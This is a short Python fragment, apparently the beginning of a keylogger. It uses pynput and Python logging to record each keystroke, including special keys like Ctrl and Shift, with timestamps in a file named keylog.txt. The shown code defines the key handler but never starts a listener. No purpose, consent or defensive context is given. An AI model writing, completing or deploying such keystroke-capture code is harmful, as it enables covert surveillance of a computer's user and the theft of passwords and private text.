from pynput import keyboard
import logging

# Configure logging to write to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(key.char)
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt, Shift)
        logging.info(f"Special key {key}")
